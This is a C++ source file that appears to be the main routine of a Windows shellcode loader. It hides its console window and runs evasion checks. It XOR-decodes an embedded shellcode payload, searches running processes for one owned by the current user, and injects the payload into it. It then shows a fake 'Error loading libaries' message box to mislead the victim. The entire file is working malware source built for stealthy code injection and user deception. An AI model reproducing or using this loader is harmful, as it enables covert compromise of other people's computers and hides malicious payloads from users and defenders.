#include <stdio.h>
#include <stdlib.h>
#include <Lmcons.h>

#include "debug.hpp"
#include "check.hpp"
#include "config.hpp"
#include "inject.hpp"

bool check_owns(int pid, wchar_t* current) {
	HANDLE process_handle, token_handle = NULL;

	process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (process_handle == INVALID_HANDLE_VALUE) {
		return false;
	}
	
	if(!OpenProcessToken(process_handle, TOKEN_QUERY, &token_handle)) {
		return false;
	}

	DWORD token_size = 0;
	GetTokenInformation(token_handle, TokenUser, NULL, 0, &token_size);

	BYTE* data = new BYTE[token_size];
	if(!GetTokenInformation(token_handle, TokenUser, data, token_size, &token_size)){
		return false;
	}
	TOKEN_USER* token_user = (TOKEN_USER*)data;
	PSID user_sid = token_user->User.Sid;

	DWORD user_size = 0;
	DWORD domain_size = 0;
    SID_NAME_USE sid;

    LookupAccountSid(NULL, user_sid, NULL, &user_size, NULL, &domain_size, &sid);
	wchar_t* user = new wchar_t[user_size + 1];
	wchar_t* domain = new wchar_t[domain_size + 1];

    if(!LookupAccountSid(NULL, user_sid, user, &user_size, domain, &domain_size, &sid)) {
		return false;
	}

    user[user_size] = L'\0';
	return wcscmp(user, current)==0;
}

const WCHAR* no_inject_list[1] = {
	L"sihost.exe",
};

bool check_bad(PROCESSENTRY32W process) {
	for (int i = 0; i < 1; i++) {
		_wcslwr_s(process.szExeFile);
		if (wcsstr(process.szExeFile, no_inject_list[i])) {
			return false;
		}
	}

	return true;
}

int main() {
	if(!DEBUG) {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}

	// protection checks
	debug("Running checks");
	if (!do_checks()) {
		return EXIT_SUCCESS;
	}
	debug("All checks completed");

#ifdef _WIN64
	debug("Running in x64 mode");
#else 
	debug("Running in x86 mode");
#endif

	// decoding the shellcode
	debug("#### START OF SHELLCODE ####");
	for (int i = 0; i < LEN; i++) {
		SC[i] = ENC[i] ^ KEY[i];
		debugnp("\\x%x", SC[i]);
	}
	debugnl();
	debug("#### END OF SHELLCODE ####");

	// getting snapshot for obtaning process list
	HANDLE snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot_handle == INVALID_HANDLE_VALUE) {
		debug("Error creating proccess snapshot");
		getlasterr();
		return EXIT_SUCCESS;
	}

	// getting current user
	wchar_t username[UNLEN+1];
	DWORD username_len = UNLEN+1;
	GetUserName(username, &username_len);

	// looping over processes to find a target
	PROCESSENTRY32 process;
	process.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32First(snapshot_handle, &process)) {
		debug("Error getting first process entry");
		getlasterr();
		return false;
	}

	do { 
		if(check_bad(process) && check_owns(process.th32ProcessID, username)) {
			debug("Target found - PID: %d", process.th32ProcessID);
			if(!try_inject(process.th32ProcessID)){
				debug("Injecting to the target failed :(");
				continue;
			}
			debug("Injecting to the target was successful :)");
			break;
		}
	} while (Process32Next(snapshot_handle, &process));

	CloseHandle(snapshot_handle);

	// fake error box
	if (FAKE_ERROR) {
		debug("Creating fake error");
		MessageBox(
			NULL,
			L"This program requires Visual Studio Windows App SDK.",
			L"Error loading libaries (0x000008)",
			MB_ICONEXCLAMATION);
	}

	return EXIT_SUCCESS;
}